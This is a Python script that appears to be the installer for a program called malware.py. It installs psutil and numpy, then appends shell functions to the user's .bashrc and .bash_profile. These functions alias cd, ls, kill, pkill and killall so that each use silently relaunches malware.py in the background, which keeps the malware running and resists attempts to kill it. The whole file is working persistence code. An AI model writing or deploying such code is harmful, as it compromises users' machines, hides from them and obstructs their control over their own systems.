import os
import subprocess

bashCommand = "pip3 install --no-warn-script-location psutil"
process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
output, error = process.communicate()

bashCommand = "pip3 install --no-warn-script-location numpy"
process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
output, error = process.communicate()

if not ".bash_profile" in os.listdir(os.path.expanduser("~/.")):
    f = open(os.path.expanduser("~/.bash_profile"), "a")
    #os.mkdir(os.path.expanduser("~/.bash_profile"))
if not ".bashrc" in os.listdir(os.path.expanduser("~/.")):
    f = open(os.path.expanduser("~/.bashrc"), "a")

file_path = os.path.realpath("./malware.py")
textappend = '''
function mycd() {
    cd $@
    (&>/dev/null python3 filepath &)
}
function myls() {
    ls $@
    (&>/dev/null python3 filepath &)
}
function mykill() {
    kill $@
    (&>/dev/null python3 filepath &)
}
function mypkill() {
    pkill $@
    (&>/dev/null python3 filepath &)
}
function mykilllall() {
    killall $@
    (&>/dev/null python3 filepath &)
}
alias kill="mykill" 
alias pkill="mypkill" 
alias killall="mykilllall" 
alias ls="myls" 
alias cd="mycd"
'''

textappend = textappend.replace("filepath",file_path)


with open(os.path.expanduser("~/.bash_profile"), "a") as file_object:
    file_object.write(textappend)

with open(os.path.expanduser("~/.bashrc"), "a") as file_object:
    file_object.write(textappend)